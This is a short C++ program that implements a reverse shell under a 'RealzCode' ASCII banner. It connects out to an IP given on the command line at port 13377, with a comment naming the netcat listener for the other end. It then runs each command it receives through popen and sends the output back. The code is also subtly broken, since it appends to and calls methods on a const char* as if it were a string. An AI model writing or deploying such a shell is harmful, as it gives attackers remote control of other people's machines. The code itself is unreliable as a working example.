#include <iostream>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <unistd.h>
#include <arpa/inet.h>

int main(int argc, char* argv[]) {
    const char* we = R"(
   _____            _      _____          _      
  |  __ \          | |    / ____|        | |     
  | |__) |___  __ _| |___| |     ___   __| | ___ 
  |  _  // _ \/ _` | |_  / |    / _ \ / _` |/ _ \
  | | \ \  __/ (_| | |/ /| |___| (_) | (_| |  __/
  |_|  \_\___|\__,_|_/___|\_____\___/ \__,_|\___|
)";

    int po = 13377; // nc -l -p 13377

    if (argc < 2) {
        std::cerr << "Please provide the IP address as a command-line argument." << std::endl;
        return 1;
    }

    const char* ip = argv[1];

    struct sockaddr_in client;
    socklen_t clientLen = sizeof(client);
    getpeername(0, (struct sockaddr*)&client, &clientLen);
    const char* clientIp = inet_ntoa(client.sin_addr);

    we += "Client IP: " + std::string(clientIp) + "\n";

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("Socket error");
        return 1;
    }

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(po);
    if (inet_pton(AF_INET, ip, &server.sin_addr) <= 0) {
        perror("Invalid address");
        return 1;
    }

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == -1) {
        perror("Connection error");
        return 1;
    }

    std::cout << ip << ":" << po << std::endl;
    send(sock, we.c_str(), we.size(), 0);

    char cmd[po];

    while (true) {
        send(sock, "$ ", 2, 0);
        ssize_t bytesRead = recv(sock, cmd, po - 1, 0);
        if (bytesRead <= 0) {
            break;
        }

        cmd[bytesRead] = '\0';
        std::string command = cmd;

        if (command == "exit\n") {
            break;
        }

        FILE* pipe = popen((command + " 2>&1").c_str(), "r");
        if (pipe == nullptr) {
            perror("Command execution error");
            return 1;
        }

        std::string output;
        char buffer[128];
        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            output += buffer;
        }
        pclose(pipe);

        send(sock, output.c_str(), output.size(), 0);
    }

    close(sock);
    return 0;
}
